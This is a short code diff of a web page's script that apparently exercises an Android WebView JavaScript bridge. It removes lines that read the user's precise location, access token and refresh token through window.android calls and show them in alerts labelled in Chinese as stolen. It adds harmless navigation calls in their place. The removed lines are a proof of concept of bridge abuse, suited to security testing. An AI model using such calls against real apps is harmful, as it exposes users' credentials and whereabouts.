@@ -12,16 +12,9 @@ starZTKD();
 
  function starZTKD() {
    
-   var stealLoc = window.android.getLocationAddress();
-   alert('窃取到您的实时精确地址位置:'+ stealLoc);
- 
-   var stealToken =window.android.getToken();
-   alert('窃取到您的token:'+ stealToken);
-   
-   var stealReToken = window.android.refreshToken();
-   alert('窃取到您的refresh token:'+ stealReToken);
- 
-   
+   window.android.goCreate();
+   window.android.goLogin();
+   window.android.goShare("123","456");
  } 
 </script>
 </body>
